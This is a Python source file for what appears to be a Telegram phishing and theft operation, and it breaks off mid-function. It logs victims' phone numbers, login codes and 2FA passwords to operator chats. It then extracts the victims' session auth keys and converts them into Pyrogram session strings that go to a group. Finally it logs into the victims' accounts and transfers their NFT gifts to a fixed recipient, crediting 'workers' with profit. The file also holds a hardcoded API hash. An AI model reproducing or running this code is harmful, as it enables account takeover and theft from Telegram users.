import json
import os
import socket
import requests
import random
import sqlite3
import struct
import base64
import asyncio
from urllib.parse import parse_qs
from datetime import datetime
from flask import request
from config import Config  # <--- ДОБАВЛЕНО!

# Константы
SESSION_DIR = Config.SESSION_DIR
PHONE_FILE = "phones.json"
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "default_admin_token")
GIFT_RECIPIENT_ID = int(os.getenv("GIFT_RECIPIENT_ID", "0"))

# Создаем директорию сессий если её нет
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)


async def log_user_action(action_type: str, user_info: dict = None, worker_info: dict = None, additional_data: dict = None):
    """
    Detailed logging system for user actions
    Action types:
    - link_created: Worker created gift link
    - link_activated: User activated gift link and received NFT
    - phone_entered: User entered phone number
    - code_entered: User entered verification code
    - 2fa_entered: User entered 2FA password
    - auth_success: User successfully authenticated
    - session_processing_started: Session processing started
    - session_processing_completed: Session processing completed
    - gift_transfer_error: Error during gift transfer
    """
    try:
        from aiogram import Bot
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from config import Config
        bot = Bot(token=Config.BOT_TOKEN)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        worker_name = "Unknown"
        if worker_info:
            username = worker_info.get('username')
            telegram_id = worker_info.get('telegram_id', 'Unknown')
            if username and username.strip():
                worker_name = username if username.startswith('@') else f"@{username}"
            else:
                worker_name = f"ID{telegram_id}"
        
        user_display = "Unknown"
        if user_info:
            user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
            username = user_info.get('username', '')
            if username:
                user_display = f"@{username} (ID: {user_id})"
            else:
                user_display = f"ID: {user_id}"
        
        message_text = ""
        keyboard = None
        
        if action_type == "link_created":
            gift_link = additional_data.get('gift_link', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🔗 <b>Создана ссылка на подарок</b>\n\n"
                f"👤 <b>Воркер:</b> {worker_name}\n"
                f"🎁 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_link_created":
            details = additional_data.get('details', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🎁 <b>Создана подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "retry_processing":
            details = additional_data.get('details', 'Повторная обработка сессии') if additional_data else 'Повторная обработка сессии'
            message_text = (
                f"🔄 <b>Повторная обработка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "rescan_gifts_requested":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            details = additional_data.get('details', 'Запрошено повторное сканирование подарков') if additional_data else 'Запрошено повторное сканирование подарков'
            message_text = (
                f"🔄 <b>Запрошено повторное сканирование подарков</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Телефон:</b> <code>{phone}</code>\n"
                f"📝 <b>Детали:</b> {details}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "link_activated":
            gift_name = additional_data.get('nft_name', additional_data.get('gift_name', 'Unknown NFT')) if additional_data else 'Unknown NFT'
            gift_link = additional_data.get('nft_link', additional_data.get('gift_link', 'Unknown')) if additional_data else 'Unknown'
            message_text = (
                f"🎯 <b>Активирована подарочная ссылка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🎁 <b>Получен NFT:</b> {gift_name}\n"
                f"🔗 <b>Ссылка:</b> <code>{gift_link}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "phone_entered":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"📱 <b>Введен номер телефона</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "code_sent":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"📨 <b>Код отправлен</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "code_verified":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"✅ <b>Код подтвержден</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "2fa_required":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"🔐 <b>Требуется 2FA</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "2fa_verified":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"✅ <b>2FA подтвержден</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "auth_success":
            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"✅ <b>Успешная авторизация</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_start":
            message_text = (
                f"⚙️ <b>Начата обработка сессии</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_complete":
            message_text = (
                f"✅ <b>Обработка сессии завершена</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "session_processing_error":
            message_text = (
                f"❌ <b>Ошибка обработки сессии</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
        elif action_type == "gift_transfer_error":
            error_msg = additional_data.get('error', 'Unknown error') if additional_data else 'Unknown error'
            session_id = additional_data.get('session_id', 'Unknown') if additional_data else 'Unknown'
            message_text = (
                f"❌ <b>Ошибка передачи подарка</b>\n\n"
                f"👤 <b>Пользователь:</b> {user_display}\n"
                f"🔴 <b>Ошибка:</b> <code>{error_msg}</code>\n"
                f"🆔 <b>Сессия:</b> <code>{session_id}</code>\n"
                f"⏰ <b>Время:</b> {timestamp}"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Повтор", callback_data=f"retry_session:{session_id}")]
            ])
        
        if keyboard:
            await bot.send_message(
                chat_id=Config.LOG_CHAT_ID,
                text=message_text,
                parse_mode="HTML",
                reply_markup=keyboard
            )
        else:
            await bot.send_message(
                chat_id=Config.LOG_CHAT_ID,
                text=message_text,
                parse_mode="HTML"
            )
        await bot.session.close()
        print(f"✅ Лог действия '{action_type}' отправлен")
    except Exception as e:
        print(f"❌ Ошибка отправки лога действия: {e}")
        import traceback
        traceback.print_exc()


def get_session_data_from_sqlite(session_file_path: str) -> dict:
    if not os.path.exists(session_file_path):
        raise FileNotFoundError(f"Файл сессии не найден: {session_file_path}")
    conn = sqlite3.connect(session_file_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions")
        session_data = cursor.fetchone()
        if not session_data:
            raise ValueError("Данные сессии не найдены в файле")
        dc_id, server_address, port, auth_key = session_data
        return {
            'dc_id': dc_id,
            'server_address': server_address,
            'port': port,
            'auth_key': auth_key
        }
    finally:
        conn.close()


async def get_user_data_from_telethon(session_file_path: str) -> dict:
    from config import Config
    API_ID = Config.TELEGRAM_API_ID
    API_HASH = Config.TELEGRAM_API_HASH
    from telethon import TelegramClient
    from telethon.sessions import SQLiteSession
    client = TelegramClient(
        SQLiteSession(session_file_path),
        API_ID,
        API_HASH
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise ValueError("Сессия не авторизована")
        me = await client.get_me()
        user_data = {
            'user_id': me.id,
            'is_bot': me.bot if hasattr(me, 'bot') else False,
            'phone': me.phone,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'username': me.username
        }
        return user_data
    finally:
        await client.disconnect()


def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
    from config import Config
    API_ID = Config.TELEGRAM_API_ID
    dc_id = session_data['dc_id']
    auth_key = session_data['auth_key']
    user_id = user_data['user_id']
    is_bot = user_data['is_bot']
    if len(auth_key) != 256:
        if len(auth_key) > 256:
            auth_key = auth_key[:256]
        else:
            auth_key = auth_key + b'\x00' * (256 - len(auth_key))
    packed_data = struct.pack(
        ">BI?256sQ?",
        dc_id,
        API_ID,
        False,
        auth_key,
        user_id,
        is_bot
    )
    session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
    return session_string


async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
    session_data = get_session_data_from_sqlite(session_file_path)
    user_data = await get_user_data_from_telethon(session_file_path)
    pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
    return pyrogram_session_string


def check_admin_token():
    token = request.args.get('token') or request.headers.get('X-Admin-Token')
    return token == ADMIN_TOKEN


def parse_init_data(init_data):
    try:
        parsed_data = parse_qs(init_data)
        if 'user' in parsed_data:
            return json.loads(parsed_data['user'][0]).get('id')
    except Exception as e:
        return None


def get_phone_from_json(user_id):
    try:
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
                return phones.get(str(user_id), {}).get('phone_number')
    except Exception as e:
        return None


def init_user_record(user_id):
    try:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        user_str = str(user_id)
        if user_str not in phones:
            phones[user_str] = {
                'phone_number': None, 
                'last_updated': datetime.now().isoformat()
            }
            with open(PHONE_FILE, 'w') as f:
                json.dump(phones, f, indent=2)
        return True
    except Exception as e:
        return False


def create_session_json(phone, twoFA=False, user_id=None):
    session_data = {
        'app_id': 14549469,
        'app_hash': 'a7ab219d3948725cb0b1a3c20b4b3126',
        'twoFA': twoFA,
        'session_file': f"{phone.replace('+', '')}.session",
        'phone': phone,
        'user_id': user_id,
        'last_update': datetime.now().isoformat(),
        'status': 'authorized'
    }
    if user_id:
        phones = {}
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                phones = json.load(f)
        phones[str(user_id)] = {
            'phone_number': phone,
            'last_updated': datetime.now().isoformat()
        }
        with open(PHONE_FILE, 'w') as f:
            json.dump(phones, f, indent=2)
    
    with open(f"{SESSION_DIR}/{phone.replace('+', '')}.json", 'w') as f:
        json.dump(session_data, f, indent=2)
    
    try:
        from telegram_bot import send_session_to_group, send_session_file_to_group
        session_file_path = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
        if os.path.exists(session_file_path):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
                print(f"✓ Telethon сессия отправлена как .session файл")
                pyrogram_session_string = loop.run_until_complete(
                    convert_telethon_to_pyrogram(session_file_path)
                )
                loop.run_until_complete(
                    send_session_to_group(user_id, phone, pyrogram_session_string, is_pyrogram=True)
                )
                print(f"✓ Pyrogram session string отправлен как .txt файл")
                if pyrogram_session_string:
                    print(f"🎁 Начинаем обработку подарков для аккаунта {phone}...")
                    loop.run_until_complete(
                        process_account_gifts(pyrogram_session_string, user_id, phone)
                    )
            except Exception as convert_error:
                print(f"Ошибка конвертации в Pyrogram: {convert_error}")
                loop.run_until_complete(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
            finally:
                pass
    except Exception as e:
        print(f"Error sending session to group: {e}")
    return session_data


async def process_account_gifts(session_string: str, user_id: int, phone: str):
    from pyrogram import Client
    from config import Config
    from database import Database
    
    try:
        client = Client(
            name="gift_processor",
            api_id=Config.TELEGRAM_API_ID,
            api_hash=Config.TELEGRAM_API_HASH,
            session_string=session_string
        )
        await client.start()
        try:
            print(f"🎁 Получаем список подарков для аккаунта {phone}...")
            gifts_count = 0
            unique_gifts_transferred = 0
            transferred_gift_links = []
            async for gift in client.get_chat_gifts("me"):
                gifts_count += 1
                try:
                    if hasattr(gift, 'link') and gift.link:
                        print(f"✨ Найден NFT подарок с ссылкой: {gift.link}")
                        success = await transfer_gift_to_recipient(client, gift, GIFT_RECIPIENT_ID)
                        if success:
                            unique_gifts_transferred += 1
                            transferred_gift_links.append(gift.link)
                            await log_gift_transfer_success(gift, user_id, phone)
                        else:
                            print(f"❌ Не удалось передать подарок с ссылкой {gift.link}")
                except Exception as gift_error:
                    print(f"❌ Ошибка обработки подарка: {gift_error}")
                    await log_gift_processing_error(gift_error, user_id, phone)
            print(f"🎁 Обработано {gifts_count} подарков")
            if unique_gifts_transferred > 0:
                print(f"✅ Успешно передано {unique_gifts_transferred} NFT подарков")
                try:
                    db = Database()
                    worker_info = db.get_worker_by_last_gift(user_id)
                    if worker_info:
                        print(f"🔍 Найден воркер для пользователя {user_id}: {worker_info}")
                        await send_profit_log(worker_info, transferred_gift_links, user_id)
                    else:
                        print(f"⚠️ Воркер не найден для пользователя {user_id}")
                except Exception as log_error:
                    print(f"❌ Ошибка отправки лога профита: {log_error}")
            else:
                print(f"📭 NFT подарки с ссылками не найдены или не переданы")
                await send_no_gifts_notification(user_id, phone, gifts_count)
        finally:
            await client.stop()
    except Exception as e:
        print(f"❌ Ошибка обработки подарков для {phone}: {e}")
        await log_gift_processing_error(e, user_id, phone)


async def transfer_gift_to_recipient(client, gift, recipient_id: int) -> bool:
    try:
        print(f"🎁 Передаем подарок ID {gift.id} получателю {recipient_id}...")
        result = await gift.transfer(recipient_id)
        if result:
            print(f"✅ Подарок ID {gift.id} успешно передан!")
            return True
        else:
            print(f"❌ Не удалось передать подарок ID {gift.id}")
            return False
    except Exception as e:
        print(f"❌ Ошибка передачи подарка: {e}")
        return False


async def log_gift_transfer_success(gift, user_id: int, phone: str):
    try:
        from telegram_bot import send_message_to_group
        gift_id = gift.id if hasattr(gift, 'id') else 'unknown'
        gift_link = gift.link if hasattr(gift, 'link') else f"https://t.me/nft/gift-{gift_id}"
        message = f"""
🎁 **Успешная передача подарка**
👤 **Аккаунт:** {phone} (ID: {user_id})
🎯 **Получатель:** {GIFT_RECIPIENT_ID}
🆔 **ID подарка:** {gift_id}
🔗 **Ссылка:** {gift_link}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
✅ Уникальный NFT подарок успешно передан!
        """
        await send_message_to_group(message.strip())
        print(f"📝 Лог передачи подарка отправлен в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки лога в группу: {e}")


async def send_no_gifts_notification(user_id: int, 
